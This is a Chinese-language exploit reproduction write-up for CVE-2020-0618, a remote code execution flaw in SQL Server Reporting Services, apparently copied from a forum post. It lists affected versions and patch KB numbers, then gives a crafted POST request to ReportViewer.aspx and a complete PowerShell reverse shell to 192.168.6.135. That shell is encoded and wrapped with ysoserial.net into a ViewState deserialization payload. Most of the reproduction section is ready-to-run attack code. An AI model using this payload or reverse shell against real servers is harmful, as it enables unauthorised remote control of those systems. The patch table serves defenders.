# （CVE-2020-0618）SQL Server 远程代码执行漏洞

> 原文：[https://www.zhihuifly.com/t/topic/3136](https://www.zhihuifly.com/t/topic/3136)

# （CVE-2020-0618）SQL Server 远程代码执行漏洞

## 一、漏洞简介

该漏洞需要经过身份验证后，攻击者向 SQL Server 的报告服务(Reporting Services) 发送特制请求进行触发。攻击成功可获得SQL Server服务的对应控制权限。

## 二、漏洞影响

| 产品 | 版本 | 修复补丁编号 |
| --- | --- | --- |
| SQL Server 2016 Service Pack 2(GDR) | 13.0.5026.0 - 13.0.5101.9 | KB4505220 |
| SQL Server 2016 Service Pack 2 CU11 | 13.0.5149.0 - 13.0.5598.27 | KB4527378 |
| SQL Server 2014 Service Pack 3 (GDR) | 12.0.6024.0 - 12.0.6108.1 | KB4505218 |
| Server 2014 Service Pack 2 CU4 | 12.0.6205.1 - 12.0.6329.1 | KB4500181 |
| SQL Server 2012 Service Pack 4 (QFE) | 11.0.7001.0 - 11.0.7462.6 | KB4057116 |

## 三、复现过程

首先登陆 ReportServer/pages/ReportViewer.aspx

```
POST /ReportServer/pages/ReportViewer.aspx HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Content-Length: X `NavigationCorrector$PageState=NeedsCorrection&NavigationCorrector$ViewState=[PayloadHere]&__VIEWSTATE=` 
```

可以在PowerShell中使用以下命令来使用[ysoserial.net](https://github.com/pwntester/ysoserial.net)工具生成有效负载：

```
$command = '$client = New-Object System.Net.Sockets.TCPClient("192.168.6.135",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  =$sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)

$encodedCommand = [Convert]::ToBase64String($bytes) `.\ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c “powershell.exe -encodedCommand $encodedCommand” -o base64 | clip` 
```

> 编译好的ysoserial.net下载地址：https://github.com/ianxtianxt/ysoserial.net/
> 
> ps：上述命令在powershell里面执行好后，会自动黏贴到剪贴板上。

![image](img/a75a74c9146e16953f568f023182acde.png)

## 参考链接

> https://www.mdsec.co.uk/2020/02/cve-2020-0618-rce-in-sql-server-reporting-services-ssrs/